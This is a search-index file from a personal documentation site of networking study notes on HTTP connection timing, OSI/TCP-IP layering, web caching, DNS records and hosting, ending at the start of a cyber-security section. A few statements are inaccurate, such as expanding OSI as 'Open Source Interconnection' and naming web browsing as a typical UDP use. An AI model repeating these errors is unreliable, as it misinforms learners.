{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Welcome to My Docs","text":"<p>This is the personal documentation site of Rajat Bhati.</p>"},{"location":"#about-me","title":"About Me","text":"<ul> <li>GitHub: https://github.com/Rajatt09</li> <li>LinkedIn: https://www.linkedin.com/in/rajatbhati</li> <li>Portfolio: https://rajatbhati.vercel.app</li> <li>Email: rajatbhati9559@gmail.com</li> </ul>"},{"location":"#documentation","title":"Documentation","text":"<p>This site contains documentation for various tools and technologies that I use. It includes snippets and information that I refer to occasionally.</p>"},{"location":"computer-network/common-terminologies/","title":"Common Terminologies","text":""},{"location":"computer-network/common-terminologies/#the-internet","title":"The Internet","text":"<p>The global network connecting devices.</p>"},{"location":"computer-network/common-terminologies/#the-www","title":"The WWW","text":"<p>A service running on the internet that provides web content.</p> Feature World Wide Web (WWW) Internet Definition A system of interlinked web pages and resources accessed via browsers. A global network of interconnected computers and servers. Purpose Enables users to access and share web pages, images, videos, and other content. Provides the infrastructure for communication, data transfer, and networking. Components Web pages, hyperlinks, browsers, HTTP, HTML, URLs. Routers, switches, servers, ISPs, protocols (TCP/IP). Protocols Used Uses HTTP/HTTPS for web browsing. Uses multiple protocols (TCP/IP, FTP, SMTP, DNS, etc.). Dependency Depends on the internet to function. Can exist without the web (e.g., email, file sharing). Example Browsing Facebook, YouTube, or Wikipedia. Sending an email, using WhatsApp, online gaming, video calls."},{"location":"computer-network/common-terminologies/#connection-oriented-service-virtual-circuit","title":"Connection-Oriented Service (Virtual Circuit)","text":"<p>Definition: A communication service where a connection is established between sender and receiver before any data is transferred, much like a telephone call.</p> <p>Protocol Example: TCP (Transmission Control Protocol)</p> <p>Key Features:</p> <ul> <li>A virtual circuit is established (logical path).</li> <li>Data arrives in order.</li> <li>Reliable: guarantees delivery, error checking, and flow control.</li> <li>Connection must be set up and closed explicitly.</li> </ul> <p>Analogy: Like a phone call\u2014you dial, connect, talk, and then hang up.</p>"},{"location":"computer-network/common-terminologies/#connectionless-service-datagram","title":"Connectionless Service (Datagram)","text":"<p>Definition: A communication service where each message (datagram) is sent independently without establishing a connection.</p> <p>Protocol Example: UDP (User Datagram Protocol)</p> <p>Key Features:</p> <ul> <li>No setup phase (no connection).</li> <li>Each packet (datagram) is routed independently.</li> <li>Unreliable: packets may arrive out of order, be duplicated, or lost.</li> <li>Lower overhead and faster for simple tasks.</li> </ul> <p>Analogy: Like sending postcards\u2014each one is sent individually and may arrive out of order or not at all.</p> <p>Note : Both VC and Datagram are similar to TCP/UDP but not same VC and Datagram work at Network layer.</p>"},{"location":"computer-network/http-connections/","title":"Comparison of HTTP Connection Types","text":"<p>Here's a comparison of Persistent HTTP with Pipelining, Non-Persistent HTTP, and Non-Persistent HTTP with Parallel Connections, using a simple example of retrieving a webpage with an HTML file and 5 image objects.</p>"},{"location":"computer-network/http-connections/#assumptions","title":"Assumptions","text":"<ul> <li>RTT (Round Trip Time): 100ms</li> <li>Transmission time for each object (HTML or image): 200ms</li> </ul>"},{"location":"computer-network/http-connections/#1-non-persistent-http-without-parallel-connections","title":"1. Non-Persistent HTTP (Without Parallel Connections)","text":"<p>In Non-Persistent HTTP, each object requires a separate TCP connection. For each object (HTML + 5 images), there will be 2 RTTs: one to establish the connection and one to send the request and receive the response.</p>"},{"location":"computer-network/http-connections/#steps-for-non-persistent-http-without-parallel-connections","title":"Steps for Non-Persistent HTTP (Without Parallel Connections)","text":"<p>Request for HTML:</p> <ul> <li>1 RTT to establish the TCP connection.</li> <li>1 RTT to request and receive the HTML.</li> <li>Total time for HTML: 2 RTT + Transmission time for HTML.</li> </ul> <p>Request for each image (5 images):</p> <ul> <li>For each image, 2 RTTs are required (1 for connection and 1 for request/response).</li> <li>Total time for 5 images: 5 \u00d7 (2 RTT + Transmission time per image).</li> </ul> <p>Total Time (Non-Persistent HTTP without Parallel Connections):</p> <ul> <li>HTML: 2 RTT + 200ms (transmission) = 200ms + 200ms = 400ms.</li> <li>5 images: 5 \u00d7 (2 RTT + 200ms) = 5 \u00d7 (200ms + 200ms) = 2000ms.</li> <li>Total time: 400ms + 2000ms = 2400ms.</li> </ul>"},{"location":"computer-network/http-connections/#2-persistent-http-without-pipelining","title":"2. Persistent HTTP (Without Pipelining)","text":"<p>In Persistent HTTP, one TCP connection is kept open for multiple requests. However, without pipelining, the client still needs to wait for the response of each object before sending the next request.</p>"},{"location":"computer-network/http-connections/#steps-for-persistent-http-without-pipelining","title":"Steps for Persistent HTTP (Without Pipelining)","text":"<p>Initial Request for HTML:</p> <ul> <li>1 RTT to establish the connection.</li> <li>1 RTT to send the request and receive the response.</li> <li>Total time for HTML: 2 RTT + Transmission time for HTML.</li> </ul> <p>Subsequent Requests for each image (5 images):</p> <ul> <li>Each image is sent after the HTML response is received.</li> <li>For each image, 1 RTT is required for the request and response (no additional connection setup).</li> <li>Total time for 5 images: 5 \u00d7 (1 RTT + Transmission time per image).</li> </ul> <p>Total Time (Persistent HTTP without Pipelining):</p> <ul> <li>HTML: 2 RTT + 200ms = 200ms + 200ms = 400ms.</li> <li>5 images: 5 \u00d7 (1 RTT + 200ms) = 5 \u00d7 (100ms + 200ms) = 1500ms.</li> <li>Total time: 400ms + 1500ms = 1900ms.</li> </ul>"},{"location":"computer-network/http-connections/#3-persistent-http-with-pipelining","title":"3. Persistent HTTP with Pipelining","text":"<p>In Persistent HTTP with Pipelining, the client can send all requests in one go without waiting for each response. This reduces RTT since requests are sent in parallel.</p>"},{"location":"computer-network/http-connections/#steps-for-persistent-http-with-pipelining","title":"Steps for Persistent HTTP with Pipelining","text":"<p>First get HTML:</p> <ul> <li>1 RTT for TCP connection (100ms)</li> <li>1 RTT for HTTP request/response (100ms)</li> <li>Transmission time for HTML (200ms)</li> </ul> <p>Total for HTML = 400ms</p> <p>Then pipeline requests for all 5 images:</p> <ul> <li>1 RTT for sending all image requests and starting to receive responses (100ms)</li> <li>Transmission time for 5 images (5 \u00d7 200ms = 1000ms)</li> </ul> <p>Total for pipelined images = 1100ms</p> <p>Total time = 400ms + 1100ms = 1500ms</p>"},{"location":"computer-network/http-connections/#4-non-persistent-http-with-parallel-connections","title":"4. Non-Persistent HTTP with Parallel Connections","text":"<p>In Non-Persistent HTTP with Parallel Connections, the client opens multiple TCP connections to fetch multiple objects simultaneously. In this case, the transmission time is reduced because objects are retrieved concurrently.</p>"},{"location":"computer-network/http-connections/#steps-for-non-persistent-http-with-parallel-connections","title":"Steps for Non-Persistent HTTP with Parallel Connections","text":"<p>Request for HTML and all 5 images:</p> <p>First, the HTML request:</p> <p>First, you must get the HTML file (sequential/independent):</p> <ul> <li>1 RTT for TCP (100ms)</li> <li>1 RTT for HTTP request/response (100ms)</li> <li>Transmission time (200ms)</li> </ul> <p>Total for HTML = 400ms</p> <p>After getting HTML, browser discovers the 5 images and can request them all in parallel:</p> <ul> <li>All TCP connections happen over the same 1 RTT (100ms)</li> <li>All HTTP requests/responses happen over the same 1 RTT (100ms)</li> <li>All transmissions happen in parallel over the same 200ms period</li> </ul> <p>Total for parallel phase = 400ms</p> <p>Total Time (Non-Persistent HTTP with Parallel Connections): 800ms.</p>"},{"location":"computer-network/http-connections/#summary-of-times","title":"Summary of Times","text":"Type of HTTP Total Time Non-Persistent HTTP (without Parallel) 2400ms Persistent HTTP (without Pipelining) 1900ms Persistent HTTP with Pipelining 1500ms Non-Persistent HTTP (with Parallel Connections) 800ms"},{"location":"computer-network/http-connections/#key-takeaways","title":"Key Takeaways","text":"<ul> <li>Non-Persistent HTTP (without parallel connections) has the highest total time because it opens a new connection for each object.</li> <li>Persistent HTTP without pipelining is faster than non-persistent, but it still waits for each object\u2019s response before sending the next request.</li> <li>Persistent HTTP with pipelining greatly reduces the time by allowing multiple requests in one go, sending them without waiting for responses in between.</li> <li>Non-Persistent HTTP with parallel connections performs better than non-persistent without parallel connections because it fetches multiple objects simultaneously.</li> </ul>"},{"location":"computer-network/http-connections/#attacks","title":"Attacks","text":"<ul> <li> <p>DoS: Single source attack that aims to overload a server and disrupt its service.</p> </li> <li> <p>DDoS: A more powerful, distributed version of DoS that involves multiple devices attacking a server, making it much harder to mitigate.</p> </li> </ul> <p>CDNs have multiple servers across the globe, so when a DDoS attack occurs, the traffic gets distributed among all those servers instead of overwhelming a single server.</p>"},{"location":"computer-network/http-connections/#what-is-cdn","title":"What is CDN ?","text":"<p>Content Delivery Network (CDN) is a network of servers that are distributed across different geographical locations. The main goal of a CDN is to deliver content to users more efficiently and quickly by reducing the distance between the user and the server hosting the content.</p> <p>CDNs Help With</p> <ul> <li>Faster website loading (especially for global users).</li> <li>Lower bandwidth usage (less traffic on the main server).</li> <li>Better security (protection from cyberattacks like DDoS).</li> </ul>"},{"location":"computer-network/http-connections/#examples-of-cdns","title":"Examples of CDNs","text":"<ul> <li>Cloudflare (protects &amp; speeds up websites).</li> <li>Akamai (used by Netflix for video streaming).</li> <li>Amazon CloudFront (used by AWS-powered websites).</li> </ul>"},{"location":"computer-network/protocol-layering/","title":"Protocol Layers in Networking: Organizing Complexity","text":"<p>Networks are complex due to multiple components like hosts, routers, links, applications, protocols, and hardware. To manage this complexity, we use a layered approach to structure network communications.</p>"},{"location":"computer-network/protocol-layering/#why-do-we-use-layers","title":"Why Do We Use Layers?","text":"<ol> <li>Simplifies Network Design: Breaking the network into layers allows each layer to handle a specific function without worrying about the entire system.</li> <li>Standardization: Different devices and systems from different vendors can work together because they follow common standards (e.g., TCP/IP model).</li> <li>Troubleshooting &amp; Development: If something breaks, we can fix a specific layer instead of the entire network.</li> </ol>"},{"location":"computer-network/protocol-layering/#the-layered-approach-osi-tcpip-models","title":"The Layered Approach: OSI &amp; TCP/IP Models","text":"<p>There are two main models for structuring network communications:</p> <ol> <li>OSI (Open Source Interconnection) Model (7 Layers): Theoretical model used for understanding networking.</li> <li>TCP/IP Model (4 Layers): Practical model used on the internet today.</li> </ol> OSI Model (7 Layers) TCP/IP Model (4 Layers) Function 7. Application 4. Application User interaction (Web, Email, FTP) 6. Presentation (Merged with Application) Data formatting (encryption, compression) 5. Session (Merged with Application) Connection management 4. Transport 3. Transport End-to-end communication (TCP, UDP) 3. Network 2. Internet Routing &amp; addressing (IP, ICMP) 2. Data Link 1. Network Access MAC addressing &amp; error detection (Ethernet, Wi-Fi) 1. Physical 1. Network Access Transmission of raw bits (Cables, Wi-Fi signals) <p>-- Seven layers</p> <ul> <li>Lower three layers are peer-to-peer</li> <li>Next four layers are end-to-end</li> </ul> <ul> <li> <p>ARP: A protocol that maps IP addresses to MAC addresses within a local network to facilitate data link layer communication.</p> </li> <li> <p>RARP: A protocol used to map MAC addresses to IP addresses, allowing devices that don't know their IP address to obtain it. It has been largely replaced by DHCP.</p> </li> </ul> <p>-- When a packet is too large to be transmitted over a network link due to MTU restrictions (e.g., Ethernet has an MTU of 1500 bytes), the Network Layer (specifically the IP layer) fragments the packet into smaller parts. -- Each fragment is sent separately over the network and contains information such as:</p> <ul> <li>Identification: A unique identifier for the original packet, so fragments can be correctly reassembled at the destination.</li> <li>Fragment Offset: Tells the receiving system where this fragment fits into the original packet.</li> <li>More Fragment (MF) flag: Indicates whether there are more fragments of the same packet.</li> </ul> <p>Application -&gt; Transport -&gt; Network -&gt; Link</p> <p>message -&gt; segment -&gt; datagram -&gt; frame</p> <p>M ----&gt; H | M ----&gt; H | H | M ----&gt; H | H | H | M</p> <p>where H is header and M is actual message : each layer adds its header to the packet</p> <p>-- Illustrative Example: Imagine you want to send an email from your computer (Device A) to another computer (Device B) over the internet.</p> <ul> <li>Application Layer: You compose the email, and the email is broken into smaller pieces (segments) by the Transport Layer.</li> <li>Network Layer (IP): The Transport Layer hands the email segments to the Network Layer, which adds the IP header with the source (your IP) and destination (Device B's IP) addresses. This becomes a packet.</li> <li>Data Link Layer (Ethernet): The packet is handed down to the Data Link Layer, which wraps it in a frame with MAC addresses (source MAC of your device and destination MAC of the router or Device B if it's in the same network).</li> <li>Physical Layer: The frame is converted into electrical signals (or optical signals, depending on the medium) and sent over the physical medium (e.g., Ethernet cables or Wi-Fi).</li> <li>Routers: If Device B is on a different network, the packet passes through several routers. Each router strips off the Data Link Layer information (MAC address), inspects the IP address, and forwards it to the next router or the destination.</li> <li>Destination Device (Device B): When the packet reaches Device B\u2019s network, the process is reversed, and Device B\u2019s application reconstructs the email.</li> </ul>"},{"location":"computer-network/protocol-layering/#comparison-with-other-devices","title":"Comparison with Other Devices","text":"Device Works at Layer Function Hub Layer 1 (Physical) Broadcasts data to all devices in a network Switch Layer 2 (Data Link) Uses MAC addresses to forward data within a network Router Layer 3 (Network) Uses IP addresses to connect different networks and forward data Modem Layer 1 (Physical) &amp; Layer 2 (Data Link) Converts digital\u2194analog signals, handles error detection Tap Layer 1 (Physical) Splits coaxial cable signals to multiple users"},{"location":"computer-network/protocol-layering/#how-data-moves-through-layers","title":"How Data Moves Through Layers","text":"<p>When you send a message over a network (e.g., sending an email), the data moves down through each layer, gaining extra information (headers), then is sent over the network. The receiver\u2019s network processes it in reverse (bottom to top).</p> <ol> <li>Application Layer: You write an email.</li> <li>Transport Layer (TCP): Email is broken into packets.</li> <li>Network Layer (IP): Packets are assigned IP addresses.</li> <li>Data Link Layer (Ethernet/Wi-Fi): Packets are sent as frames.</li> <li>Physical Layer (Fiber, Copper, Wireless): Data is converted to signals.</li> <li>Receiver: Data reaches the receiver and is rebuilt layer by layer.</li> </ol> <p>Note: Sockets are used evertime either TCP or UDP sockets are used for connection internammly i.e. TCP sockets or UDP sockets.</p> <ul> <li>An IP address alone is not sufficient to identify a specific process on a host.</li> <li>In combination, the IP address and the port number form a unique identifier for a process on a specific host, often called a socket (IP address + port).</li> </ul>"},{"location":"computer-network/protocol-layering/#rtp-vs-udp","title":"RTP Vs UDP","text":""},{"location":"computer-network/protocol-layering/#udp-user-datagram-protocol","title":"UDP (User Datagram Protocol):","text":"<p>Type: Transport protocol.</p> <p>Purpose: Provides basic, connectionless, and fast data transmission.</p> <p>Features:</p> <ul> <li>No packet ordering or synchronization.</li> <li>No error recovery or congestion control.</li> </ul> <p>Use: Suitable for applications where speed is crucial and occasional data loss is acceptable (e.g., web browsing, DNS).</p>"},{"location":"computer-network/protocol-layering/#rtp-real-time-transport-protocol","title":"RTP (Real-time Transport Protocol):","text":"<p>Type: Application-layer protocol built on top of UDP.</p> <p>Purpose: Specifically designed for real-time audio, video, and multimedia streaming.</p> <p>Features:</p> <ul> <li>Adds packet sequencing and timestamping.</li> <li>Provides synchronization of media streams.</li> <li>Works with other protocols (like RTCP) for error monitoring and feedback.</li> </ul> <p>Use: Ideal for live streaming, video calls, VoIP, where timing and ordering of packets are essential.</p>"},{"location":"computer-network/web-caching/","title":"Web Caching Explained","text":""},{"location":"computer-network/web-caching/#what-is-web-caching","title":"What is Web Caching?","text":"<p>A web cache (proxy server) sits between your browser and the internet. It saves copies of web pages and files so that future requests for the same data load faster without contacting the original server.</p>"},{"location":"computer-network/web-caching/#types-of-proxy-servers","title":"Types of Proxy Servers","text":"<p>\ud83d\udd39 Forward Proxy \u2192 Sits between users and the internet (e.g., used in offices &amp; schools).</p> <ul> <li>Hiding your real IP address.</li> <li>Bypassing website restrictions (e.g., if YouTube is blocked in school).</li> </ul> <p>\ud83d\udd39 Reverse Proxy \u2192 Sits between users and a web server (used by websites to manage traffic).</p> <ul> <li>Website security \u2192 Hides the real web server to protect against hackers.</li> <li>Load balancing \u2192 Distributes traffic across multiple servers to prevent crashes.</li> <li>Caching \u2192 Stores website content for faster loading.</li> </ul>"},{"location":"computer-network/web-caching/#when-to-use-a-proxy","title":"When to Use a Proxy?","text":"<ul> <li>If you just want to bypass website restrictions (e.g., school blocks YouTube).</li> <li>If you don\u2019t care about encryption but want a different location.</li> </ul>"},{"location":"computer-network/web-caching/#when-to-use-a-vpn","title":"When to Use a VPN?","text":"<ul> <li>If you want privacy &amp; security (e.g., protecting personal data on public WiFi).</li> <li>If you want to bypass geo-restrictions (e.g., watching Netflix US from another country).</li> </ul>"},{"location":"computer-network/web-caching/#approach","title":"Approach","text":"<p>First, let's understand the key components of a web caching problem:</p> <ul> <li>Request rate (\u03bb) from the institution</li> <li>Object size</li> <li>Link capacities (LAN and access link)</li> <li>Internet delay</li> <li>Cache hit rate (if cache is used)</li> </ul> <p>Basic Performance Metrics:</p> <ul> <li>Utilization (\u03c1) = Arrival rate \u00d7 Average service time = Traffic Intenstiy</li> <li>Service rate (\u03bc) = Link capacity / Object size</li> <li>Average response time = Internet delay + Access link delay + LAN delay</li> </ul> <p>For M/M/1 queues, use the formula E[T] = 1/(\u03bc-\u03bb) for access delay.</p> <p>Note: If cache is present : Hit rate = x ; ex: x= 0.4</p> <ul> <li>Average delay = 0.4 \u00d7 (cache delay) + 0.6 \u00d7 (Internet delay + access delay)</li> </ul>"},{"location":"computer-network/web-caching/#example","title":"Example","text":"<ul> <li> <p>Service rate (\u03bc) = Link capacity / Object size = 100 Mbps / 1 Mbit = 100 requests/second</p> </li> <li> <p>Arrival rate (\u03bb) = 15 requests/second (given in problem)</p> </li> <li> <p>Traffic intensity (\u03c1) = \u03bb/\u03bc = 15/100 = 0.15 = 15%</p> </li> </ul>"},{"location":"computer-network/web-caching/#without-cache-vs-with-cache","title":"Without Cache vs With Cache","text":""},{"location":"computer-network/web-caching/#scenario-1-no-cache","title":"Scenario 1: No Cache","text":"<pre><code>sequenceDiagram\n        participant User\n        participant Internet\n        participant Server\n\n        User-&gt;&gt;Internet: Request (2s delay)\n        Internet-&gt;&gt;Server: Forward Request\n        Server-&gt;&gt;Internet: Send Content\n        Internet-&gt;&gt;User: Return Content (2s delay)\n        Note right of User: Total Time: ~4s</code></pre>"},{"location":"computer-network/web-caching/#scenario-2-with-cache","title":"Scenario 2: With Cache","text":"<pre><code>sequenceDiagram\n        participant User\n        participant Cache\n        participant Server\n\n        User-&gt;&gt;Cache: Request\n        alt Cache Hit\n                Cache-&gt;&gt;User: Return Content (milliseconds)\n        else Cache Miss\n                Cache-&gt;&gt;Server: Forward Request\n                Server-&gt;&gt;Cache: Send Content\n                Cache-&gt;&gt;User: Return Content\n        end</code></pre>"},{"location":"computer-network/web-caching/#example-calculation","title":"Example Calculation","text":""},{"location":"computer-network/web-caching/#given-data","title":"Given Data:","text":"<ul> <li>Request Rate: 15 requests/second</li> <li>Object Size: 100,000 bits</li> <li>Internet Delay: 2 seconds</li> <li>Cache Hit Rate: 40%</li> </ul>"},{"location":"computer-network/web-caching/#results-with-cache","title":"Results With Cache:","text":"<pre><code>pie title Request Distribution\n        \"Cache Hits (Fast)\" : 40\n        \"Server Requests (Slow)\" : 60</code></pre> <pre><code>flowchart TD\n        A[User wants Facebook.com] --&gt; B{Check Cache}\n        B --&gt;|Found| C[Return Cached Page]\n        B --&gt;|Not Found| D[Get from Facebook Server]\n        D --&gt; E[Save to Cache]\n        E --&gt; F[Return Page to User]</code></pre>"},{"location":"computer-network/dns/dns-records/","title":"DNS Protocol","text":"<p>DNS (Domain Name System) operates using a specific protocol to query and reply about domain name resolutions. The protocol is based on messages that consist of both queries and responses. The message format is the same for both types, but they differ in content.</p>"},{"location":"computer-network/dns/dns-records/#dns-message-structure","title":"DNS Message Structure","text":"<p>Each DNS message consists of several sections:</p>"},{"location":"computer-network/dns/dns-records/#header","title":"Header","text":"<p>This contains information that is common to both query and response messages.</p> <ul> <li>Identification (16 bits): This is a unique number used to match queries with their responses. Both the query and reply will have the same identification number to ensure they are related.</li> <li>Flags: A series of flags that tell the server/client what the message represents or requests:</li> <li>1 bit: Query or Reply (indicates whether the message is a query or a response).</li> <li>1 bit: Recursion Desired (this indicates if the sender wants the resolver to perform recursive querying).</li> <li>1 bit: Recursion Available (this indicates if the server supports recursion).</li> <li>1 bit: Authoritative Answer (indicates whether the response is from an authoritative server or not).</li> </ul>"},{"location":"computer-network/dns/dns-records/#fields-in-dns-messages","title":"Fields in DNS Messages","text":""},{"location":"computer-network/dns/dns-records/#for-a-query","title":"For a query:","text":"<ul> <li>Name: The domain name you're asking about (e.g., www.example.com).</li> <li>Type: The type of DNS record you are asking for (e.g., A record for an IP address, MX record for mail exchange).</li> </ul>"},{"location":"computer-network/dns/dns-records/#for-a-response","title":"For a response:","text":"<ul> <li>RRs (Resource Records): The answer to the query, which will include resource records such as:</li> <li>Authoritative records: For authoritative DNS servers.</li> <li>Additional information: Which may help in further resolving the query, e.g., IP addresses of authoritative servers.</li> </ul>"},{"location":"computer-network/dns/dns-records/#inserting-records-into-dns-registering-a-domain","title":"Inserting Records into DNS (Registering a Domain)","text":"<p>Here's an example to understand how DNS records are inserted when you register a new domain.</p>"},{"location":"computer-network/dns/dns-records/#step-by-step-process","title":"Step-by-Step Process","text":"<p>Let\u2019s assume you start a new company called \"Network Utopia\" and you register the domain example.com. Here\u2019s how it works:</p>"},{"location":"computer-network/dns/dns-records/#domain-registration","title":"Domain Registration","text":"<ol> <li>You register the domain example.com with a DNS registrar, like Network Solutions.</li> <li>During this registration process, you will provide the names and IP addresses of your authoritative name servers (DNS servers).</li> </ol>"},{"location":"computer-network/dns/dns-records/#registrar-inserts-records","title":"Registrar Inserts Records","text":"<p>The registrar will then insert DNS records into the TLD (Top-Level Domain) server for .com (since .com is the TLD of your domain). These records typically include:</p> <ul> <li>NS (Name Server) Record: Specifies which DNS servers are authoritative for your domain. This is where DNS queries for example.com will be sent.</li> <li>Example: (example.com, dns1.example.com, NS)<ul> <li>This means example.com is associated with dns1.example.com as its authoritative name server.</li> </ul> </li> <li>A (Address) Record: This specifies the IP address of the authoritative DNS server.</li> <li>Example: (dns1.example.com, 212.212.212.1, A)<ul> <li>This means the authoritative DNS server for example.com is located at IP address 212.212.212.1.</li> </ul> </li> </ul>"},{"location":"computer-network/dns/dns-records/#create-additional-records-for-subdomains","title":"Create Additional Records for Subdomains","text":"<p>Now, as a part of managing the domain, you can create additional DNS records for your website or services. For example:</p> <ul> <li>A record for www.example.com: This will associate the www subdomain with the IP address of your web server.</li> <li> <p>MX (Mail Exchange) Record for example.com: This will specify the mail server responsible for handling emails sent to example.com.</p> </li> <li> <p>Example:</p> <ul> <li>A record: (www.example.com, 212.212.212.2, A)</li> <li>This means that www.example.com points to the IP address 212.212.212.2 (your web server).</li> <li>MX record: (example.com, mail.example.com, MX)</li> <li>This specifies that the mail server for example.com is located at mail.example.com.</li> </ul> </li> </ul>"},{"location":"computer-network/dns/dns/","title":"Domain Name System (DNS)","text":""},{"location":"computer-network/dns/dns/#what-is-dns","title":"What is DNS?","text":"<p>DNS is like the internet's phone book - it converts human-readable domain names (www.google.com) into IP addresses (142.250.190.78).</p>"},{"location":"computer-network/dns/dns/#dns-hierarchy","title":"DNS Hierarchy","text":"<pre><code>graph TD\n    A[Root DNS Servers] --&gt; B[Top Level Domain .com]\n    A --&gt; C[Country Code TLD .in]\n    B --&gt; D[Second Level i.e. Authoritative Servers google.com]\n    D --&gt; E[Subdomain]</code></pre> <ul> <li>www.google.com is a subdomain of google.com even if www is removed it will work fine , it was required previously to separate web traffic from other like mail etc.</li> </ul>"},{"location":"computer-network/dns/dns/#dns-resolution-process","title":"DNS Resolution Process","text":"<pre><code>sequenceDiagram\n    participant C as Client\n    participant R as Resolver\n    participant Root as Root DNS\n    participant TLD as TLD Server\n    participant Auth as Auth Server\n\n    C-&gt;&gt;R: www.google.com?\n    R-&gt;&gt;Root: Ask for .com servers\n    Root-&gt;&gt;R: Here's .com servers\n    R-&gt;&gt;TLD: Ask for google.com\n    TLD-&gt;&gt;R: Here's google's servers\n    R-&gt;&gt;Auth: Ask for www.google.com\n    Auth-&gt;&gt;R: Here's the IP\n    R-&gt;&gt;C: IP is 142.250.190.78</code></pre> <p>-- Root Name Server Directs to TLD Server</p> <ul> <li>The Root Name Server doesn\u2019t know the exact IP but knows where to look.</li> <li>It tells the LNS to ask the Top-Level Domain (TLD) Server for .com.</li> </ul>"},{"location":"computer-network/dns/dns/#types-of-dns-servers","title":"Types of DNS Servers","text":"<p>1. DNS Resolver (Recursive) : Local Name Server (LNS)</p> <ul> <li> <p>The LNS (provided by your ISP or network) checks if it already knows the IP address.</p> </li> <li> <p>First point of contact</p> </li> <li>Handles client requests</li> <li>Caches results</li> <li>Example: ISP's DNS server</li> </ul> <p>2. Root Name Servers (.)</p> <ul> <li>Top of DNS hierarchy</li> <li>13 root server clusters</li> <li>Points to TLD servers</li> </ul> <p>3. TLD Servers (.com, .org, .net)</p> <ul> <li>Manages top-level domains</li> <li>Points to authoritative servers</li> <li>Example: Verisign for .com</li> </ul> <p>4. Authoritative Name Servers</p> <ul> <li>Final source of truth</li> <li>Holds actual DNS records</li> <li>Example: Google's DNS servers</li> </ul>"},{"location":"computer-network/dns/dns/#dns-records","title":"DNS Records","text":"<pre><code>graph LR\n    A[DNS Records] --&gt; B[A Record&lt;br&gt;IP Address]\n    A --&gt; C[CNAME&lt;br&gt;Alias]\n    A --&gt; D[MX&lt;br&gt;Mail Server]\n    A --&gt; E[TXT&lt;br&gt;Text Info]</code></pre> <ul> <li>Host Aliasing</li> </ul> <p>What it does: Allows a single domain name to point to multiple other names or addresses.</p> <p>Why it\u2019s needed: Helps manage multiple services under one name.</p> <p>Example: Canonical Name (CNAME): www.example.com</p> <p>Alias Names: shop.example.com, blog.example.com, etc.</p> <ul> <li>Mail Server Aliasing</li> </ul> <p>What it does: Redirects email traffic to the right mail servers.</p> <p>Why it\u2019s needed: Email servers often have different names from websites.</p> <p>DNS uses MX (Mail Exchange) records to find the correct mail server.</p>"},{"location":"computer-network/dns/dns/#example-visiting-wwwgooglecom","title":"Example: Visiting www.google.com","text":"<ol> <li>Check browser cache</li> <li>Check OS cache</li> <li>Check resolver cache</li> <li>Ask root servers</li> <li>Ask .com servers</li> <li>Ask Google's servers</li> <li>Get IP address</li> <li>Cache result</li> </ol>"},{"location":"computer-network/dns/web-hosting/","title":"Web Hosting &amp; DNS Records","text":""},{"location":"computer-network/dns/web-hosting/#dns-records-explained","title":"DNS Records Explained","text":"<ol> <li>A Record (Address)</li> </ol> <pre><code>flowchart LR\n    A[example.com] --&gt;|A Record| B[192.168.1.10]</code></pre> <ul> <li>Points domain to IP address</li> <li>Direct connection</li> <li>Fast resolution</li> <li> <p>Example: <code>example.com \u2192 192.168.1.10</code></p> </li> <li> <p>CNAME (Canonical Name)</p> </li> </ul> <pre><code>flowchart LR\n    A[www.example.com] --&gt;|CNAME| B[example.com]\n    B --&gt;|A Record| C[192.168.1.10]</code></pre> <ul> <li>Points domain to another domain</li> <li>Like an alias</li> <li>Flexible but slower</li> <li> <p>Example: <code>www.example.com \u2192 example.com</code></p> </li> <li> <p>MX Record (Mail Exchange)</p> </li> </ul> <pre><code>flowchart LR\n    A[example.com] --&gt;|MX Record| B[mail.example.com]\n    B --&gt;|Priority 10| C[mail1.example.com]\n    B --&gt;|Priority 20| D[mail2.example.com]</code></pre> <ul> <li>Email routing</li> <li>Multiple servers</li> <li>Priority based</li> <li> <p>Example: <code>example.com \u2192 mail1.example.com (10)</code></p> </li> <li> <p>TXT Record (Text)</p> </li> <li> <p>SPF records</p> </li> <li>DKIM verification</li> <li>Domain verification</li> <li>Example: <code>v=spf1 include:_spf.google.com ~all</code></li> </ul>"},{"location":"computer-network/dns/web-hosting/#real-world-example-website-setup","title":"Real-World Example: Website Setup","text":"<pre><code>flowchart TD\n    A[Buy Domain] --&gt; B[Get Hosting]\n    B --&gt; C[Configure DNS]\n    C --&gt; D[A Record Setup]\n    C --&gt; E[CNAME Setup]\n    C --&gt; F[MX Setup]\n    D --&gt; G[Point to Host IP]\n    E --&gt; H[Setup www]\n    F --&gt; I[Setup Email]</code></pre>"},{"location":"computer-network/dns/web-hosting/#common-configurations","title":"Common Configurations","text":"<ol> <li>Basic Website</li> </ol> <pre><code>example.com       A     192.168.1.10\nwww.example.com   CNAME example.com\n</code></pre> <ol> <li>Email Setup</li> </ol> <pre><code>example.com       MX    mail.example.com (10)\nmail.example.com  A     192.168.1.20\n</code></pre> <ol> <li>Subdomain Setup</li> </ol> <pre><code>blog.example.com  A     192.168.1.30\nshop.example.com  A     192.168.1.40\n</code></pre>"},{"location":"computer-network/dns/web-hosting/#best-practices","title":"Best Practices","text":"<ul> <li>Use A records for apex domain</li> <li>Use CNAME for subdomains</li> <li>Set appropriate TTL</li> <li>Regular DNS audits</li> <li>Backup DNS records</li> </ul>"},{"location":"computer-network/dns/web-hosting/#types-of-hosting","title":"Types of Hosting","text":"<pre><code>flowchart TD\n    subgraph \"Shared Hosting\"\n        SH[Server]\n        SH --&gt; W1[Website 1]\n        SH --&gt; W2[Website 2]\n        SH --&gt; W3[Website 3]\n    end\n\n    subgraph \"VPS Hosting\"\n        VPS[Physical Server]\n        VPS --&gt; V1[Virtual Server 1]\n        VPS --&gt; V2[Virtual Server 2]\n        V1 --&gt; VW1[Website 1]\n        V2 --&gt; VW2[Website 2]\n    end\n\n    subgraph \"Dedicated Hosting\"\n        DH[Physical Server]\n        DH --&gt; DW1[Single Website]\n    end\n\n    subgraph \"Cloud Hosting\"\n        CH[Cloud Infrastructure]\n        CH --&gt; S1[Server 1]\n        CH --&gt; S2[Server 2]\n        CH --&gt; S3[Server 3]\n        S1 --&gt; CW1[Website]\n        S2 --&gt; CW1\n        S3 --&gt; CW1\n    end</code></pre>"},{"location":"cyber-security/common-terminologies/","title":".NET Applications","text":"<p>.NET (pronounced \"dot net\") is a software development framework by Microsoft that supports building many types of applications:</p>"},{"location":"cyber-security/common-terminologies/#types-of-applications-built-with-net","title":"Types of Applications Built with .NET","text":"<ul> <li>Web Applications \u2013 Using ASP.NET</li> <li>Desktop Applications \u2013 Using Windows Forms, WPF</li> <li>Mobile Apps \u2013 Using .NET 